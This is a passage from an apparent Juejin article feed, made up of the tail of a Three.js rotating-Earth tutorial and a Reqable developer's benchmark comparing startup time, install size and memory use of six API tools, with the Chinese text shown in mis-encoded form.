earth.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">createLabel</span>(<span class="hljs-string">'Earth'</span>, <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0</span>)));

<span class="hljs-comment">// å…‰æº</span>
scene.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AmbientLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">0.5</span>));
<span class="hljs-keyword">const</span> dirLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">0.8</span>);
dirLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>);
scene.<span class="hljs-title function_">add</span>(dirLight);

<span class="hljs-comment">// åŠ¨ç”»å¾ªç¯</span>
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  earth.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.005</span>;
  controls.<span class="hljs-title function_">update</span>();
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  labelRenderer.<span class="hljs-title function_">render</span>(scene, camera);
})();

<span class="hljs-comment">// å“åº”çª—å£å˜åŒ–</span>
<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> {
  camera.<span class="hljs-property">aspect</span> = innerWidth / innerHeight;
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
  labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
});
</code></pre>
<p>ğŸ“‚Â <strong>æ ¸å¿ƒä»£ç ä¸å®Œæ•´ç¤ºä¾‹ï¼š</strong> Â Â Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqq790git%2Fmy-three-app.git" target="_blank" title="https://github.com/qq790git/my-three-app.git" ref="nofollow noopener noreferrer">my-three-app</a></p>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p><strong>å¦‚æœä½ å–œæ¬¢æœ¬æ•™ç¨‹ï¼Œè®°å¾—ç‚¹èµ+æ”¶è—ï¼å…³æ³¨æˆ‘è·å–æ›´å¤šThree.jså¼€å‘å¹²è´§</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6æ¬¾APIå·¥å…·æ€§èƒ½å®æµ‹ï¼Œè°æ‰æ˜¯ç‹è€…ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597251197426384922</link>    <guid>https://juejin.cn/post/7597251197426384922</guid>    <pubDate>2026-01-20T14:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597251197426384922" data-draft-id="7597258378590699530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6æ¬¾APIå·¥å…·æ€§èƒ½å®æµ‹ï¼Œè°æ‰æ˜¯ç‹è€…ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,æµ‹è¯•"/> <meta itemprop="datePublished" content="2026-01-20T14:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MegatronKing"/> <meta itemprop="url" content="https://juejin.cn/user/2559318798642792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6æ¬¾APIå·¥å…·æ€§èƒ½å®æµ‹ï¼Œè°æ‰æ˜¯ç‹è€…ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2559318798642792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MegatronKing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:23:13.000Z" title="Tue Jan 20 2026 14:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯Reqableçš„å¼€å‘è€…ï¼Œå¾ˆä¹…æ²¡æœ‰å¯¹äº§å“çš„æ€§èƒ½è¿›è¡Œæ‘¸åº•äº†ï¼Œä¸Šä¸€æ¬¡æµ‹è¯•è¿˜æ˜¯2024å¹´åˆã€‚å› æ­¤ï¼Œæˆ‘å†³å®šåœ¨3.1ç‰ˆæœ¬å¼€å§‹ä¹‹å‰å†åšäº†ä¸€æ¬¡æ•´ä½“æ€§èƒ½çš„ç»Ÿè®¡ï¼Œé¡ºä¾¿ä¹Ÿæ‹‰ä¸Šäº†å‡ å®¶åŒè¡Œï¼Œåšä¸ªå¯¹æ¯”æµ‹è¯•ï¼Œäº†è§£ä¸‹è¿™ä¸ªèµ›é“é‡Œçš„å„å®¶æƒ…å†µã€‚</p>
<p>è¿™å‡ å®¶åŒè¡Œï¼Œæœ‰å›½å†…çš„ä¹Ÿæœ‰å›½å¤–çš„ï¼Œå…¨éƒ½æ˜¯çŸ¥åäº§å“ã€‚è¿™é‡Œå…ˆå ä¸ªç”²ï¼Œ<strong>æœ¬ç¯‡æ–‡ç« çš„æµ‹è¯•å—é™äºè®¾å¤‡ã€ç½‘ç»œã€ç³»ç»Ÿã€éšæœºæƒ…å†µç­‰ç­‰å¯èƒ½ä¼šæœ‰åå·®ï¼Œæµ‹è¯•ç»“æœä¸ä»£è¡¨è½¯ä»¶çš„å“è´¨ï¼Œä»…ä¾›å‚è€ƒ</strong>ã€‚</p>
<p>æµ‹è¯•è®¾å¤‡å’Œç¯å¢ƒï¼š</p>
<ul>
<li>13è‹±å¯¸çš„MacBook Pro</li>
<li>M2èŠ¯ç‰‡</li>
<li>8Gå†…å­˜</li>
<li>Sequoia 15.7çš„ç³»ç»Ÿ</li>
<li>200Mçš„ç½‘ç»œå¸¦å®½ã€‚</li>
</ul>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å„ä¸ªç»´åº¦çš„æµ‹è¯•ç»“æœã€‚</p>
<h2 data-id="heading-0">1. å¯åŠ¨æ—¶é—´</h2>
<p>ç›¸ä¿¡å¤§å®¶æœ€å…³å¿ƒçš„å°±æ˜¯ç¨‹åºçš„å¯åŠ¨æ—¶é—´äº†ï¼Œæ¯æ¬¡æµ‹è¯•éƒ½è®©æˆ‘æƒ³èµ·å¾ˆå¤šå¹´å‰åœ¨å¤§å­¦å®¿èˆé‡Œæ¯”è°ç”µè„‘çš„Windowsç³»ç»Ÿå¯åŠ¨æ›´å¿«çš„é‚£ä¸ªä¸‹åˆã€‚</p>
<p><strong>æ—¶é—´å°±æ˜¯æ•ˆç‡ï¼Œæ•ˆç‡å°±æ˜¯æ—©ç‚¹å¹²å®Œæ´»å»æ‘¸é±¼ã€‚</strong></p>
<p>æµ‹è¯•å‰çš„å‡†å¤‡å·¥ä½œï¼Œæ¯ä¸ªæµ‹è¯•ç¨‹åºéƒ½æå‰å…ˆåˆå§‹åŒ–ä¸€éï¼Œæœ‰è´¦å·ç³»ç»Ÿçš„çš„ç™»å½•è´¦å·ï¼Œå†å¯¼å…¥åŒä¸€ä¸ªAPIé›†åˆï¼ˆä¸€å…±32ä¸ªAPIï¼‰ï¼Œå¹¶ä¸”æ‰“å¼€é›†åˆä¸­çš„ç¬¬ä¸€ä¸ªAPIï¼Œå…¶ä»–çš„é…ç½®éƒ½ä¿æŒåˆå§‹åŒ–çš„çŠ¶æ€ä¸å˜ã€‚</p>
<p>æ‰“å¼€è§†é¢‘å½•åˆ¶ï¼Œä¾æ¬¡å¯åŠ¨æ¯ä¸ªæµ‹è¯•ç¨‹åºã€‚æˆ‘ä»¬å°†ç¨‹åºå¯åŠ¨ç¬é—´åˆ°ç•Œé¢æ•°æ®å®Œæ•´æ˜¾ç¤ºè¿™ä¸ªæ—¶é—´å·®ï¼Œè§†ä¸ºå¯åŠ¨æ—¶é—´ï¼Œé€šè¿‡è§†é¢‘ç¼–è¾‘å·¥å…·è·å–è§†é¢‘ç”»é¢å¸§æ¥è®¡ç®—ï¼Œä¸‹é¢æ˜¯æ•°æ®è¡¨æ ¼ï¼š</p>















































<table><thead><tr><th>APIå·¥å…·</th><th>å¼€å§‹æ—¶é—´ç‚¹</th><th>å®Œæˆæ—¶é—´ç‚¹</th><th>å¯åŠ¨æ—¶é—´ï¼ˆç§’ï¼‰</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>0.01.30</td><td>0.01.70</td><td>0.4</td></tr><tr><td><strong>ApiFox</strong></td><td>0.03.12</td><td>0.06.55</td><td>3.43</td></tr><tr><td><strong>ApiPost</strong></td><td>0.07.19</td><td>0.12.78</td><td>5.59</td></tr><tr><td><strong>Postman</strong></td><td>0.14.29</td><td>0.17.09</td><td>2.8</td></tr><tr><td><strong>Insomnia</strong></td><td>0.18.88</td><td>0.23.40</td><td>4.52</td></tr><tr><td><strong>Bruno</strong></td><td>0.25.12</td><td>0.27.32</td><td>2.2</td></tr></tbody></table>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„æµ‹è¯•è§†é¢‘ï¼ˆå·²è½¬GIFï¼‰ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1632dae8c30a49468816fa713e4fd5e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=Tk89to7g4ESc2RUei0AFROAkqM8%3D" alt="test.gif" loading="lazy"/></p>
<p>æˆ‘ä»¬æ¥ç®€å•åˆ†æä¸‹è¿™ä¸ªæµ‹è¯•ç»“æœã€‚è§†é¢‘å¯ä»¥çœ‹å‡ºï¼ŒReqableåœ¨åŒå‡»åº”ç”¨å›¾æ ‡ä¹‹åï¼Œç¨‹åºçª—å£å‡ ä¹ç«‹åˆ»å°±å‡ºç°äº†ï¼Œè¿™æ˜¯å¾—ç›Šäº<code>Flutter</code>æ¡†æ¶å¸¦æ¥çš„åŸç”Ÿèˆ¬çš„çª—å£å¯åŠ¨é€Ÿåº¦ã€‚è€Œå…¶ä»–ç¨‹åºï¼Œå‡ ä¹éƒ½è¦ç­‰å¾…è‡³å°‘1sæ‰ä¼šå‡ºç°çª—å£ï¼Œä»–ä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒç‰¹ç‚¹ï¼Œç”¨çš„<code>Electron</code>æ¡†æ¶ï¼Œåœ¨å¯åŠ¨çª—å£ä¹‹å‰è¦å…ˆå¯åŠ¨å¤šä¸ªè¿›ç¨‹ï¼Œç„¶ååŠ è½½æµè§ˆå™¨å†…æ ¸ç­‰ç­‰ï¼Œæœ€åæ‰ä¼šå¯åŠ¨çª—å£ã€‚</p>
<p>çª—å£å¯åŠ¨åå°±æ˜¯åŠ è½½æ•°æ®ï¼Œæ¯”è¾ƒæ…¢çš„å‡ æ¬¾ç¨‹åºå¯ä»¥æ˜æ˜¾çœ‹åˆ°ä¸€ä¸ªè¾ƒé•¿çš„åŠ è½½è¿‡ç¨‹ï¼Œå’Œç½‘ç»œçŠ¶å†µä»¥åŠæœåŠ¡å™¨çŠ¶å†µæ¯æ¯ç›¸å…³ï¼Œçº¯ç¦»çº¿å­˜å‚¨çš„Brunoåˆ™å¿«å¾ˆå¤šï¼ˆæ²¡æœ‰ç½‘ç»œè¯·æ±‚çš„è¿‡ç¨‹ï¼‰ã€‚Reqableè™½ç„¶ä¹Ÿä½¿ç”¨äº†äº‘ç«¯æ•°æ®ï¼Œä½†æ˜¯ç­–ç•¥ä¸Šä¼šå…ˆåŠ è½½æœ¬åœ°æ•°æ®ï¼Œç„¶åå†ä»äº‘ç«¯å¢é‡æ›´æ–°ï¼Œå› æ­¤ä¸ä¼šå—åˆ°ç½‘ç»œå› ç´ å½±å“ï¼Œé€Ÿåº¦å°±æå¿«ã€‚</p>
<p>åœ¨æ–­ç½‘æƒ…å†µä¸‹ï¼ŒApiFoxã€ApiPostå’ŒPostmanä¸‰æ¬¾éƒ½æ— æ³•æ­£å¸¸è¿›å…¥åº”ç”¨ï¼ŒReqableã€Insomniaå’ŒBrunoåˆ™å¯ä»¥æ­£å¸¸è¿›å…¥ï¼Œè€Œä¸”å¯ä»¥è§‚å¯Ÿåˆ°Insomniaçš„å¯åŠ¨é€Ÿåº¦ä¼šæœ‰æ˜æ˜¾æå‡ã€‚å¦‚æœé‡åˆ°ç½‘ç»œæˆ–è€…æœåŠ¡å™¨æ•…éšœï¼Œå‰ä¸‰æ¬¾éƒ½å°†åœæ‘†ï¼Œåªæœ‰åä¸‰æ¬¾èƒ½æ­£å¸¸å¯åŠ¨ã€‚</p>
<p>å¦å¤–ï¼Œç”±äºè®¾è®¡é—®é¢˜ï¼ŒInsomniaå’ŒBrunoæ‰“å¼€è¿›å…¥å°±æ˜¯é¦–é¡µï¼Œå¹¶æ²¡æœ‰è‡ªåŠ¨åŠ è½½ä¹‹å‰æ‰“å¼€çš„APIï¼Œè¿™ä¸€ç‚¹èŠ‚çœäº†äº›è®¸æ—¶é—´ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œä¸Šé¢åªæœ‰Reqableåšåˆ°äº†ç§’å¯åŠ¨ï¼Œæ–­å´–å¼é¢†å…ˆå…¶ä»–å‡ æ¬¾ã€‚å¯ä»¥é¢„æµ‹ï¼Œåœ¨æœ‰å¤§é‡çš„APIæ•°æ®çš„æ—¶å€™ï¼ŒReqableçš„å¯åŠ¨ä¼˜åŠ¿ä¼šæ›´åŠ æ˜æ˜¾ã€‚</p>
<h2 data-id="heading-1">2. ç©ºé—´å ç”¨</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å®‰è£…åŒ…å’Œæ‰€éœ€è¦çš„å®‰è£…ç©ºé—´ã€‚å®‰è£…åŒ…çš„å¤§å°ä»£è¡¨ç€æ›´æ–°å’Œä¸‹è½½éœ€è¦å¤šä¹…ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ€§èƒ½è¯„ä¼°çš„ä¸€ä¸ªé‡è¦æŒ‡æ ‡ï¼Œå®‰è£…åŒ…ä½“ç§¯è¶Šå¤§å¾€å¾€æ„å‘³ç€æ½œåœ¨ç”¨æˆ·å˜æˆçœŸæ­£ç”¨æˆ·çš„é—¨æ§›è¶Šé«˜ã€‚å®‰è£…ç©ºé—´ä»£è¡¨ç€éœ€è¦å ç”¨ç”¨æˆ·å¤šå¤§çš„ç£ç›˜ç©ºé—´ï¼Œå¯¹äºå ªæ¯”é»„é‡‘çš„Mac SSDæ¥è¯´ï¼Œè‚¯å®šæ˜¯è¶Šå°è¶Šå¥½ã€‚</p>








































<table><thead><tr><th>APIå·¥å…·</th><th>å®‰è£…åŒ…å¤§å°ï¼ˆMBï¼‰</th><th>å®‰è£…ç©ºé—´ï¼ˆMBï¼‰</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>30.7</td><td>86.7</td></tr><tr><td><strong>ApiFox</strong></td><td>226.2</td><td>705.2</td></tr><tr><td><strong>ApiPost</strong></td><td>125.6</td><td>340.2</td></tr><tr><td><strong>Postman</strong></td><td>122.2</td><td>317.9</td></tr><tr><td><strong>Insomnia</strong></td><td>341.7</td><td>1020</td></tr><tr><td><strong>Bruno</strong></td><td>155.1</td><td>417.6</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3686b4109a84d58a568d2995d2d5b04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=qvqBpFWWTwreMyTo9himYn1Hm1k%3D" alt="image.png" loading="lazy"/></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„å®‰è£…ç©ºé—´ä»…ä»…ä»£è¡¨è½¯ä»¶æœ€å°‘æ‰€éœ€ç©ºé—´ï¼Œåœ¨è½¯ä»¶å¯åŠ¨åå¯èƒ½è¿˜ä¼šä»æœåŠ¡å™¨æ‹‰å–å¿…è¦çš„èµ„æºã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç»å¸¸åšå®‰è£…åŒ…ä¼˜åŒ–æ—¶å¸¸å¸¸é‡‡å–çš„æ–¹æ¡ˆã€‚</p>
<p>éš¾ä»¥ç½®ä¿¡ï¼Insomniaçš„å®‰è£…æ‰€éœ€ç©ºé—´å·²ç»å¤¸å¼ å¾—è¶…è¿‡äº†1ä¸ªGï¼Œè®°å¾—2024å¹´æµ‹è¯•è¿‡ä¸€æ¬¡æ‰ä¸åˆ°600Mã€‚ApiFoxä¹Ÿä¸é‘å¤šè®©ï¼Œè‡³å°‘éœ€è¦700Mçš„ç©ºé—´ï¼Œå®‰è£…åŒ…ä¹Ÿè¶…è¿‡äº†200Mã€‚ApiPostå’ŒPostmanä¸¤è€…å·®ä¸å¤šï¼Œè™½ç„¶ä¹Ÿä¸å°ï¼Œä½†æ˜¯æ¯”å‰é¢è¿™ä¸¤ä¸ªå¥½å¤šäº†ã€‚</p>
<p>Postmanå®˜ç½‘ä¸‹è½½çš„å®‰è£…åŒ…æ²¡æœ‰Macä¸“ç”¨çš„dmgæ ¼å¼ï¼Œè€Œæ˜¯zipæ ¼å¼ã€‚ç”±äºä¸¤è€…éƒ½æ˜¯å‹ç¼©åŒ…ï¼Œåªæ˜¯æ ¼å¼ä¸åŒï¼Œå®é™…ä¸ŠåŒºåˆ«å¹¶ä¸å¤§ã€‚</p>
<p>Reqableçš„è¡¨ç°ä¾ç„¶å¾ˆä¼˜ç§€ï¼Œ30Må¤šä¸€ç‚¹çš„å®‰è£…åŒ…å’Œä¸åˆ°90Mçš„å®‰è£…ç©ºé—´ï¼Œæ˜¯çœŸæ­£çš„å°è€Œç¾ã€‚</p>
<h2 data-id="heading-2">3. å†…å­˜å ç”¨</h2>
<p>å¦‚æœè¯´å‰é¢çš„å®‰è£…åŒ…å¤§å°å’Œå®‰è£…ç©ºé—´å¯¹äºç°ä»£å¤§å®¹é‡SSDå·¥ä½œè®¾å¤‡æ¥è¯´æ— æ‰€è°“çš„è¯ï¼Œé‚£ä¹ˆè¿è¡Œæ—¶çš„å†…å­˜å ç”¨è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤§å½±å“çš„ï¼Œæ¯•ç«Ÿç°åœ¨å†…å­˜æ¡çš„ä»·æ ¼ä¸€ç›´åœ¨æ¶¨æ¶¨æ¶¨ã€‚</p>
<p>å†…å­˜å ç”¨æµ‹è¯•çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½å¯åŠ¨äº†ï¼Œç„¶åç½®äºåå°ï¼ˆä¹Ÿå°±æ˜¯å•¥äº‹éƒ½ä¸å¹²ï¼‰ï¼Œç„¶åç”¨ç³»ç»Ÿè‡ªå¸¦çš„æ´»åŠ¨ç›‘è§†å™¨æŸ¥çœ‹è¿™äº›åº”ç”¨çš„å†…å­˜ä½¿ç”¨æƒ…å†µå³å¯ã€‚ç”±äºåº”ç”¨ç¨‹åºå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¨éƒ¨è¿›ç¨‹çš„å†…å­˜å ç”¨è®¡ç®—æ€»å’Œã€‚</p>








































<table><thead><tr><th>APIå·¥å…·</th><th>è¿›ç¨‹æ€»æ•°</th><th>å†…å­˜å ç”¨æ€»å’Œï¼ˆMBï¼‰</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>1</td><td>103.4</td></tr><tr><td><strong>ApiFox</strong></td><td>9</td><td>824.8</td></tr><tr><td><strong>ApiPost</strong></td><td>4</td><td>328.6</td></tr><tr><td><strong>Postman</strong></td><td>6</td><td>517.3</td></tr><tr><td><strong>Insomnia</strong></td><td>4</td><td>437</td></tr><tr><td><strong>Bruno</strong></td><td>4</td><td>282.2</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82665572e36b42deab7d0ae7249cff1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=IXGqURIkvK57tAMkNGajLxJqkug%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77b4e0331b8f487c8a91d0220b316076~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=okxA5eqkler1NtpbtWziu1eWEXs%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ç»„æ•°æ®é‡Œé¢æœ€è€€çœ¼çš„æ˜¯ApiFoxå…±æœ‰9ä¸ªè¿›ç¨‹è¶…è¿‡800Mçš„å†…å­˜ä½¿ç”¨ï¼Œæˆ‘ä¸€åº¦ä»¥ä¸ºæ“ä½œå¤±è¯¯ï¼Œé‡å¤å¼€äº†åº”ç”¨ï¼Œåå¤éªŒè¯åå‘ç°æ•°æ®å¹¶æ²¡æœ‰é—®é¢˜ã€‚</p>
<p>å…¶æ¬¡å°±æ˜¯Postmançš„6ä¸ªè¿›ç¨‹è¶…è¿‡500Mçš„å†…å­˜ä½¿ç”¨ã€‚</p>
<p>Reqableåªæœ‰100Må¤šä¸€ç‚¹ï¼Œåªæœ‰ä¸€ä¸ªä¸»è¿›ç¨‹ï¼Œæ„å‘³ç€æ²¡æœ‰ä»»ä½•çš„åå°è¿›ç¨‹ï¼Œå¹²å‡€åå°ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œä»¥ä¸Šæ•°æ®ä»…ä»…æ˜¯å¯åŠ¨åº”ç”¨ä¸åšä»»ä½•æ“ä½œç½®äºåå°ï¼Œè¿è¡Œæ—¶çš„å†…å­˜ä½¿ç”¨ç›¸ä¿¡åªå¤šä¸å°‘ã€‚</p>
<hr/>
<p>ä¸‰ä¸ªç»´åº¦æµ‹è¯•ç»“æŸï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freqable.com%2F" target="_blank" title="https://reqable.com/" ref="nofollow noopener noreferrer">Reqable</a>åœ¨è¿™äº›APIå·¥å…·é‡Œé¢æ˜¯ç»å¯¹å½“ä¹‹æ— æ„§çš„æ€§èƒ½ä¹‹ç‹! è™½ç„¶éšç€ç§‘æŠ€çš„è¿›æ­¥ï¼Œè®¾å¤‡çš„æ€§èƒ½è¶Šæ¥è¶Šé«˜ï¼Œä½†æ˜¯è°ä¸çˆ±åˆå¿«åˆå°åˆå¹²å‡€çš„åº”ç”¨ç¨‹åºå‘¢ï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> 